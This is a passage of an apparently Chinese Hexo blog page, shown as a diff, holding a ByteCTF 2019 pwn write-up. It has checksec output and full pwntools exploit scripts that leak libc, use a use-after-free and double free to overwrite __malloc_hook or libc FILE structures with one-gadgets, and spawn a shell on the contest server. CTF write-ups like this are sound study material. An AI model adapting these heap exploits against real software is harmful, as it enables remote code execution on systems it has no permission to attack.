class="number">0xf1</span>)+p64(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x8f</span>))</span><br><span class="line">    new(<span class="number">4</span>, <span class="number">0xe8</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">'A'</span>+p64(libc.address+onegadgets[<span class="number">3</span>])*<span class="number">11</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">'A'</span>+p64(libc.address+<span class="number">0x19e7a0</span>)+<span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(<span class="number">0xffffffff</span>)+<span class="string">'\x00'</span>*<span class="number">0x10</span>+p64(libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]+<span class="number">128</span>))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        io = elf.process()<span class="comment">#env=&#123;"LD_PRELOAD": libc.path&#125;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a><strong>mulnote</strong></h2><hr>
+<h3 id="题目信息-3"><a href="#题目信息-3" class="headerlink" title="题目信息"></a>题目信息</h3><blockquote>
+<p>nc 112.126.101.96 9999</p>
+<p>题目附件： <a href="https://adworld.xctf.org.cn/media/uploads/task/16165d2e0b564bb09e95e4003bfb4e99.zip" target="_blank" rel="noopener">点击下载附件 1</a></p>
+</blockquote>
+<hr>
+<h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ file mulnote</span><br><span class="line">mulnote: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, stripped</span><br><span class="line">$ checksec mulnote</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><p>程序应该是经过了混淆的,读不太懂直接盲测,发现存在UAF的漏洞,然后按照UAF的套路直接打,结果还打通了</p>
+<hr>
+<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, aslr=<span class="literal">False</span>, terminal=[<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>])</span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./mulnote'</span></span><br><span class="line">lib = <span class="string">'./libc-2.23.so'</span></span><br><span class="line">ip = <span class="string">'112.126.101.96'</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">elf = ld(exe, lib)</span><br><span class="line">libc = ELF(lib) <span class="keyword">if</span> lib <span class="keyword">else</span> elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(script=<span class="string">''</span>)</span>:</span></span><br><span class="line">    attach(io, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(c)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;'</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, note)</span>:</span></span><br><span class="line">    choice(<span class="string">'C'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'size&gt;'</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'note&gt;'</span>, note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, note)</span>:</span></span><br><span class="line">    choice(<span class="string">'E'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'index&gt;'</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">'new note&gt;'</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">'R'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'index&gt;'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">libc_off = <span class="number">0x3c4b78</span></span><br><span class="line">onegadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0x90</span>, <span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">'B'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">'C'</span>*<span class="number">0x10</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    show()</span><br><span class="line">    io.recvuntil(<span class="string">'[*]note[0]:\n'</span>)</span><br><span class="line">    libc.address = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - libc_off</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">'D'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">'E'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x68</span>, <span class="string">'F'</span>*<span class="number">0x13</span>+p64(libc.address+onegadgets[<span class="number">1</span>]))</span><br><span class="line">    choice(<span class="string">'C'</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        io = elf.process()<span class="comment">#env=&#123;"LD_PRELOAD": libc.path&#125;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://abcdefghijklmnopqrst.xyz">骑麦兜看落日</a>
+            <p>原文链接：<a href="http://abcdefghijklmnopqrst.xyz/2019/09/10/WP_2019ByteCTF/">http://abcdefghijklmnopqrst.xyz/2019/09/10/WP_2019ByteCTF/</a>
+            <p>发表日期：<a href="http://abcdefghijklmnopqrst.xyz/2019/09/10/WP_2019ByteCTF/">September 10th 2019, 11:30:00 am</a>
+            <p>更新日期：<a href="http://abcdefghijklmnopqrst.xyz/2019/09/10/WP_2019ByteCTF/">September 10th 2019, 12:00:00 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/08/26/WP_2019OGeek/" title= "[WriteUp]2019OGeek">
+                    <div class="prevTitle">[WriteUp]2019OGeek</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zNzY1OS8xNDE5MA==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:qimaidoukanluori@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/qimaidoukanluori" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">到访的小伙伴: <span id="busuanzi_value_site_pv"></span>只 </span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:30vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#vip"><span class="toc-number">1.1.</span> <span class="toc-text">vip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目信息"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析"><span class="toc-number">1.1.2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题过程"><span class="toc-number">1.1.3.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关资料"><span class="toc-number">1.1.5.</span> <span class="toc-text">相关资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mheap"><span class="toc-number">1.2.</span> <span class="toc-text">mheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目信息-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题过程-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#notefive"><span class="toc-number">1.3.</span> <span class="toc-text">notefive**</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目信息-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题过程-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.3.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mulnote"><span class="toc-number">1.4.</span> <span class="toc-text">mulnote</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目信息-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题过程-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">1.4.4.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 48
+        </div>
+        <!-- search  -->
+        
+            <div class="site-search popup-trigger">
+                <span class="iconfont-archer search-icon">&#xe627;</span>
+            </div>
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2019/09/10/WP_2019ByteCTF/" >[WriteUp]2019ByteCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2019/08/26/WP_2019OGeek/" >[WriteUp]2019OGeek</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/2019/07/31/WP_2019CISCN final/" >[WriteUp]2019CISCN final</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/07</span><a class="archive-post-title" href= "/2019/07/07/WP_2019WCTF/" >[WriteUp]2019WCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2019/07/02/Asm_WASM格式化字符串攻击尝试/" >[Asm]WASM格式化字符串攻击尝试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2019/01/22/Code_Python可变类型的一些问题/" >[Code]Python可变类型的一些问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/2019/01/13/Asm_WASM初步/" >[Asm]WASM初步</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/20</span><a class="archive-post-title" href= "/2018/12/20/Binary_通过a的leak/" >[Binary]通过%a的leak</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/2018/12/07/WP_hxpCTF/" >[WriteUp]hxpCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2018/11/27/WP_2018BCTF/" >[WriteUp]2018BCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/Binary_IO_FILE源码分析/" >[Binary]IO_FILE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2018/11/05/Binary_ArmPwn/" >[Asm]ARMPwn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/WP_上海杯/" >[WriteUp]上海杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2018/10/27/WP_HCTF/" >[WriteUp]HCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2018/10/27/WP_湖湘杯/" >[WriteUp]湖湘杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2018/10/27/WP_SECCONCTF/" >[WriteUp]SECCONCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/2018/10/24/Binary_Tcache/" >[Binary]Tcache</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/Asm_RealmodeAsm/" >[Asm]RealmodeAsm</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/WP_2018护网杯/" >[WriteUp]护网杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/06</span><a class="archive-post-title" href= "/2018/10/06/Binary_IDADynamic/" >[Binary]IDADynamic</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href= "/2018/10/05/Linux_pwn环境搭建/" >[Linux]pwn环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href= "/2018/10/05/WP_DragonCTF/" >[WriteUp]DefCampCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href= "/2018/10/05/WP_InCTF/" >[WriteUp]InCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/28</span><a class="archive-post-title" href= "/2018/09/28/Binary_PDF/" >[Binary]PDF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/27</span><a class="archive-post-title" href= "/2018/09/27/Linux_GDB的python调试/" >[Linux]GDB的Python调试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/27</span><a class="archive-post-title" href= "/2018/09/27/Linux_GDB/" >[Linux]GDB</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/2018/09/25/WP_DefCampCTF/" >[WriteUp]DefCampCTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2018/09/18/Android_JNI/" >[Android]JNI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2018/09/18/BInary_HeapExploit/" >[Binary]HeapExploit</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/13</span><a class="archive-post-title" href= "/2018/09/13/Binary_IO_FILE/" >[Binary]IO_FILE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2018/09/10/Linux_GDB的源码调试/" >[Linux]GDB源码调试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2018/09/01/Binary_ptmalloc源码分析/" >[Binary]ptmalloc源码分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/WP_pwnable.tw/" >[WriteUp]pwnable.tw</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2018/08/21/Code_Python学习手册_7/" >[Code]Python学习手册_第七部分_异常和工具</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2018/08/21/WP_网鼎杯/" >[WriteUp]网鼎杯</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2018/08/14/Code_Python学习手册_6/" >[Code]Python学习手册_第六部分_类和OOP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/13</span><a class="archive-post-title" href= "/2018/08/13/WP_JarvisOJ/" >[WriteUp]JarvisOJ</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2018/08/10/Code_Python学习手册_5/" >[Code]Python学习手册_第五部分_模块</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2018/08/05/Code_Python学习手册_4/" >[Code]Python学习手册_第四部分_函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2018/08/05/Binary_Heap/" >[Binary]Heap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/Linux_INT80/" >[Linux]int 80</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/Code_Python学习手册_3/" >[Code]Python学习手册_第三部分_语句和语法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2018/07/25/Binary_Canary/" >[Binary]Canary</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/24</span><a class="archive-post-title" href= "/2018/07/24/Code_Python学习手册_2/" >[Code]Python学习手册_第二部分_类型和运算</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span><a class="archive-post-title" href= "/2018/07/22/Binary_fmt/" >[Binary]FormatString</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
